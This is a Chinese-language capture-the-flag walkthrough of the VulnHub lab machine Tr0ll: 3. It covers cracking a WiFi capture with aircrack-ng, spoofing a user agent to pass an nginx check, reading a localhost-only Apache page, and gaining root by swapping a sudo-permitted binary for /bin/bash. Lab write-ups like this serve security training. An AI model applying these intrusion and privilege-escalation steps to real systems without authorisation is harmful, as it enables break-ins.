# Tr0ll: 3

2025.03.11 https://www.vulnhub.com/entry/tr0ll-3,340/

## Ip

192.168.5.39

## Scan

使用这个凭据 ssh 登陆 start:here

发现，但是密码不对:

```
start@Tr0ll3:~/redpill$ cat /home/start/redpill/this_will_surely_work
step2:Password1!
```

发现另外一个密码字典：

```
/.hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is/fun/ok/here/rofl/sorry/you/made/it/gold_star.txt
```

gold_star.txt 的所属用户是 eagle ，使用字典爆破一下，没有爆出。

发现另外一个文件 /var/log/.dist-manage/wytshadow.cap 是 wifi 的 pacp 文件，需要破解密码：

```
aircrack-ng wytshadow.cap -w gold_star.txt
```

找到 wifi 密码 gaUoCe34t1 , wifi SID 是 wytshadow , 是系统上的用户，使用这个凭据登陆 wytshadow:gaUoCe34t1

登陆后，发现 genphlux 的 suid oohfun 它一直在执行 /lol/bin/run.sh 打印信息，没什么利用价值。

sudo -l 显示 (root) /usr/sbin/service nginx start 启动 nginx，新开了 8080 端口，转向 web。

访问一直显示 403，查看一下 nginx 的配置文件 cat /etc/nginx/sites-enabled/default 发现：

```
server {
	listen 8080 default_server;
	listen [::]:8080 default_server;
		if ($http_user_agent !~ "Lynx*"){
    return 403;
}
```

这里 UA 要以 Lynx 开头，修改 UA 得到新的凭据：

```
curl -A 'Lynx M' http://192.168.5.39:8080
genphlux:HF9nd0cR!
```

进入到 genphlux 用户后，sudo -l 发现 (root) /usr/sbin/service apache2 start ，启动 apache2 发现开放了 80 端口。但是访问还是 403，查看配置文件 /etc/apache2/sites-available/000-default.conf 发现只允许本地访问 allow from 127.0.0.1 使用 wget -q -O- http://127.0.0.1 进行访问 127 得到用户凭据提示：

```
<!-- Wow, looking at the source code, you are truly l33t! The next step uses fido:x4tPl! >
```

但是 fido:x4tPl! 这个凭据不对，切换不了用户。

发现私钥文件 maleus 可能是这个用户 maleus 的，尝试登陆，登陆成功。

在 .viminfo 文件中发现了密码 `B^slc8I$` 应该是 maleus 用户的。sudo -l 显示 (root) /home/maleus/dont_even_bother strings 发现字符串 `xl8Fpx%6`，运行程序，输入这个字符串提示正确。这个程序属于 maleus 直接替换它：

```
mv dont_even_bother dont_even_bother.bak
cp /bin/bash dont_even_bother
sudo /home/maleus/dont_even_bother
```

拿到了最终的 root 权限,读取到 root flag：

```
root@Tr0ll3:/root# cat flag.txt
You are truly a Jedi!

Twitter Proof:

Pr00fThatTh3L33tHax0rG0tTheFl@g!!

@Maleus21
```
